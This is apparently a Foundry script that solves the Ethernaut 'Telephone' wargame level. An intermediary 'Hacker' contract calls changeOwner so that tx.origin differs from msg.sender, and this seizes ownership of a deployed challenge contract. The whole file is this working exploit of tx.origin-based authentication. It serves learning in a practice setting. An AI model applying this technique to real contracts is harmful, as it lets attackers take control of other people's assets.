// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Telephone} from "../src/Telephon.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract Hacker {
    constructor(Telephone _telephon, address _newOwner) {
        _telephon.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephone = Telephone(0xeF1a59d476224fd6714d59608f74D9aCB93E8E98);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Hacker(telephone, vm.envAddress("MY_ADDRESS"));
        console.log("The address: ", telephone.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
